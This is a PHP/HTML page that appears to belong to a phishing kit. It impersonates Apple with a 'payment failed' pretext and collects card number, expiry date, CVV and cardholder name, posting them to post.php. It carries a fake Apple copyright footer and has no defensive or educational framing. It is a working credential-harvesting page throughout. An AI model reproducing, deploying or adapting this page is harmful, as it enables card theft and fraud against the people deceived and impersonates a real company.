<?php require 'main.php';?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/cc.css">
    <title>login</title>
</head>
<body>
    <header>
        <div class="logo"><img src="res/img/logo.png"></div>
        <div class="right"><img src="res/img/icon.png"></div>
    </header>
    <main>
        <div class="continer">
            <div class="ico"><img src="res/img/cc.png"> </div>
            <div class="title"><span>Add or update your payment method</span></div>
            <div class="p"><p>There was an issue paying your last bill using your payment method provided. Please update your payment method.</p></div>
            <form action="post.php" method="post">
            <div class="tile">Details</div>
             <div class="col"><label for="cc">Card number</label><input type="text" id="cc" name="cc" placeholder="Required" required></div>
            <div class="card-details">
            <div class="l"><label for="expiry-date">Expiry Date</label><input type="text" id="exp" name="exp" placeholder="MM/YYYY" required></div>
            <div class="r"> <label for="cvv">CVV</label><input type="text" id="cvv" name="cvv" placeholder="Security code" required>
            </div>
             </div>
            <div class="col"><label for="card-holder-name"></label><input type="text" id="holder-name" name="holder-name" placeholder="Name on card" required></div>
            <div class="but"><div class="button"><button type="submit"> Save changes</button> </div> </div>
        </div>
    </main>
    <footer>
        <div class="f1"><a href="#">System Status</a> | <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a></div>
        <div class="f2">Copyright © 2026 Apple Inc. All rights reserved.</div>
    </footer>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        $("#cc").mask("0000000000000000");
        $("#exp").mask("00/0000");
        $("#cvv").mask("0000");
    </script>
</body>

</html>